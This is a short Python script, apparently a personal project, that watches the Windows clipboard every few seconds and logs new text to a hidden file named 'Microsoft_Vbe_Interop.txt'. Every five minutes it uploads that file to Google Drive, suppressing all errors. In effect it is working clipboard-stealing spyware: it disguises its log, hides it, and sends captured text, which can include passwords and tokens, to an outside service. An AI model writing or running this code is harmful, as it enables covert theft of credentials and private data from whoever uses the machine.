import time
import win32clipboard
import schedule
import Google_Drive_API
import os



HISTORY_FILE = r"E:\Microsoft_Vbe_Interop.txt"

def update_history(text):
    try:
        with open(HISTORY_FILE, "r") as file:
            history = file.readlines()
    except FileNotFoundError:
        history = []
    # # Add new text to history
    if text and text not in history:
            # Save history to file    
        with open(HISTORY_FILE, "a") as file:
            file.write(f'\n{text}')
            os.system(f"attrib +h {HISTORY_FILE}")
            
def check_clipboard():
    win32clipboard.OpenClipboard()
    try:
        clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
        clipboard_text = clipboard_data.decode("utf-8")
        update_history(clipboard_text)
    except Exception as e:
        # Handle exceptions (e.g., clipboard contains non-text data)
        pass
    finally:
        win32clipboard.CloseClipboard()
def Task():
    try:
        Google_API_Credentials_Key=r"E:\Codeing\Python Language\Projects\Project_15_Clipboard_Copy\Credentials_Key.json"
        script_dir = os.path.dirname(os.path.abspath(__file__))
        credentials_file = 'Credentials_Key.json'
        Google_API_Credentials_Key = os.path.join(script_dir, credentials_file)
        Google_Drive_API.Google_Drive_API(HISTORY_FILE,Google_API_Credentials_Key)
    except Exception as f:
        pass   
    
# Break For 5 Sec
time.sleep(5)

schedule.every(5).minutes.do(Task)

while True:
    check_clipboard()
    schedule.run_pending()
    time.sleep(5)  # Check clipboard every 1 second